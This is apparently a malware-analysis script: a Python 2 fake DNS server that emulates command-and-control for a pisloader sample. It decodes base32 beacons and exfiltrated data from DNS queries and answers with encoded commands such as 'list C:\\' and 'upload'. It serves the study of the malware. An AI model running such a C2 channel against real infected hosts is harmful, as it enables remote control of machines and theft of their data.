#!/usr/bin/env python

# Fake DNS Server to be used against a pisloader sample. The server will 
# respond with a randomly selected command from the list of supported 
# responses. Please note that the IP and TARGETED_DOMAIN variables must be set 
# below.

import socket, base64, random
from dnslib import A, AAAA, CNAME, MX, RR, TXT
from dnslib import DNSHeader, DNSRecord, QTYPE
	
TARGETED_DOMAIN = "logitech-usa" # Set this.
IP = "172.16.1.1" # Set this too.

def pick_command():
	commands = ["sifo", "drive", "list C:\\", "upload", "open", ""]
	return random.choice(commands)

data_received = ""
def dns_handler(s, peer, data):
	global data_received
	command = pick_command()
	msg = "C" + base64.b32encode(command).replace("=",'')
	beacon = False
	request = DNSRecord.parse(data)
	id = request.header.id
	qname = request.q.qname
	qtype = request.q.qtype
	if qname.label[2] == TARGETED_DOMAIN:
		data = qname.label[0]
		if len(data) > 10:
			data = data[10:]
			if len(data) % 8 != 0:
				data = data + ("=" * (8 - len(data) % 8))
			decoded_data = base64.b32decode(data)
			if len(decoded_data) == 4:
				if decoded_data == decoded_data.upper():
					decoded_data = decoded_data + " [BEACON]"
					beacon = True
					if data_received != "":
						print "[+] Decoded Data Received: %s" % (data_received)
						data_received = ""
			else:
				data_received += decoded_data 
			print "[+] Raw Data Received: %s" % qname.label[0]
			if beacon: print "[+] Sending Command: %s | Encoded: %s" % (command, msg)

	if not beacon: msg = "C"

	reply = DNSRecord(DNSHeader(id=id, qr=1, rd=1, ra=1), q=request.q)
	if qtype == QTYPE.TXT:
		reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(msg)))
	else:
		reply.add_answer(RR(qname, QTYPE.CNAME, rdata=CNAME(msg)))
	s.sendto(reply.pack(), peer)

AF_INET = 2
SOCK_DGRAM = 2
s = socket.socket(AF_INET, SOCK_DGRAM)
s.bind(('', 53))

print "[+] Wekby pisloader DNS server starting..."
while True:
		data, peer = s.recvfrom(8192)
		dns_handler(s,peer,data)
	